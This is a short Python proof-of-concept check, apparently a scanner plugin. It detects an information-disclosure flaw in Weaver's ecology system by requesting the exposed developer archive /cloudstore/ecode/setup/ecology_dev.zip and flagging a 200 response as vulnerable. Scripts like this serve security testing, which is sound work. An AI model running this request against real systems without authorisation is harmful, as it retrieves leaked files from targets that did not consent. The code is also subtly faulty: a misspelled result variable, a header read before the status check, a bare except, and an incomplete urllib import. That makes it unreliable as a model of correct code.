import requests
import urllib


def verify(url):
    relsult = {
        'name': '泛微ecology系统setup接口存在信息泄露漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko)',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close'
    }
    vurl = urllib.parse.urljoin(url, "/cloudstore/ecode/setup/ecology_dev.zip")
    try:
        response = requests.get(vurl, headers=headers, timeout=5)
        file_size_str = int(response.headers['Content-Length']) / 1024  # KB
        if response.status_code == 200:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult
